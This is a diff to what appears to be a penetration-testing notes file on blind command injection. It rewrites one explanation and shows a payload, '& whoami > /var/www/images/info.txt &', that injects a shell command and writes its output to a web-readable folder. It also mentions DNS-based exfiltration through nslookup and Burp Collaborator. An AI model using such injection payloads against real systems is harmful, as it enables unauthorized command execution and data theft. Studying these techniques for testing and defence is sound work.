@@ -668,7 +668,8 @@ We can exfiltrate the data by using **Blind Command Injection** in multiple ways
 
 **2.1)** If we find **writable** folder we can use that to exfiltrate the information such as:
 
-```& whoami > /var/www/images/info.txt & ``` ---> here we are using 2 times ```&``` Command Injection Operator in order to isolate our command, then we are executing ```whoami``` and storing the output of it inside /var/www/images as we are dealing with Blind Command Injection and we don't get anything in the HTTP Response + we idenfited that /var/www/images is writable folder. Then simply navigate to the htttp://target-app.com/images/info.txt and observe that output of ```whoami``` command is stored in _info.txt file_
+```& whoami > /var/www/images/info.txt & ``` ---> here we are using 2 times ```&``` Command Injection Operator in order to isolate our command, then we are executing ```whoami``` and storing the output of it inside /var/www/images as we are dealing with Blind Command Injection and we don't get anything in the HTTP Response + we idenfited that /var/www/images is writable folder. And then by navigating to http://vulnerablesite/images?image=info.txt we can find the output of our ```whoami``` command
+
 
 **2.2)** Another approach that is very powerful in case we don't have _writable folder_ is **Data Exfiltration with DNS Lookup** so, we can combine **nslookup + Burp Collaborator** in order to exfiltrate the data. With following payload we can exfiltarte the data to our Burp Collaborator:
 
